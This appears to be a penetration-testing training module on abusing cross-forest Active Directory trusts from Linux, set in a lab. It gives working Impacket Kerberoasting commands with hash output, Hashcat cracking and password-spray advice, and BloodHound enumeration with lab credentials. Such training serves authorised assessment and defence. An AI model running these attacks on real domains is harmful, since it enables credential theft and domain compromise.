# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

---

As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command. Performing this against the `FREIGHTLOGISTICS.LOCAL` domain, we see one SPN entry for the `mssqlsvc` account.

## Cross-Forest Kerberoasting

#### Using GetUserSPNs.py

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```

Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.

#### Using the -request Flag

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```

We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.

Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.

---

## Hunting Foreign Group Membership with Bloodhound-python

As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the [Python implementation of BloodHound](https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.

On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `ACADEMY-EA-DC01` as the nameserver.

#### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Once this is in place, we can run the tool against the target domain as follows:

#### Running bloodhound-python Against INLANEFREIGHT.LOCAL

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>
```

We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.

#### Compressing the File with zip -r

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)
```

We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.

#### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

The `bloodhound-python` command will look similar to the previous one:

#### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
swmpdnky@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```

After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

#### Viewing Dangerous Rights through BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)

---

## Closing Thoughts on Trusts

As seen in the past few sections, there are several ways to leverage domain trusts to gain additional access and even do an "end-around" and escalate privileges in our current domain. For example, we can take over a domain that our current domain has a trust with, and find password re-use across privileged accounts. We've seen how Domain Admin rights in a child domain nearly always mean we can escalate privileges and compromise the parent domain using the ExtraSids attack. Domain trusts are a rather large and complex topic. The primer in this module has given us the tools to enumerate trusts and perform some standard intra-forest and cross-forest attacks.